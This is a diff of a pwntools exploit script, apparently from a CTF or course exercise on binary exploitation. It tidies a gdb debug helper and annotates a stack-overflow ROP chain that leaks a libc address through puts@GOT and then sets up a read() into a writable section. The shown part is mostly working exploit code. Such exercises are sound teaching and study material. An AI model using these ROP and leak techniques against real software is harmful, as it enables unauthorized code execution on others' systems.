@@ -17,15 +17,8 @@ uu64    = lambda data               :u64(data.ljust(8, '\0'))
 lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
 
 def debug(breakpoint=''):
-    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
-    gdbscript = 'directory %smalloc/\n' % glibc_dir
-    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
-    gdbscript += 'directory %sstdlib/\n' % glibc_dir
-    gdbscript += 'directory %slibio/\n' % glibc_dir
-    gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
-    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
@@ -46,6 +39,7 @@ rw_section = 0x601000
 bof = elf.sym["bof"]
 payload = "a" * 0x28 
 
+## 1. Leak libc address 
 ## puts(pust.got)
 payload += p64(rdi_ret) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(bof)
 se(payload)
@@ -62,7 +56,6 @@ syscall = read_addr + 0xf
 
 
 payload = "a" * 0x28
-## read(0, rw_section, 0x10)
 payload += p64(pop_rdi) + p64(0)
 payload += p64(pop_rsi) + p64(rw_section)
 payload += p64(pop_rdx) + p64(0x30) + p64(read_addr) + p64(bof)
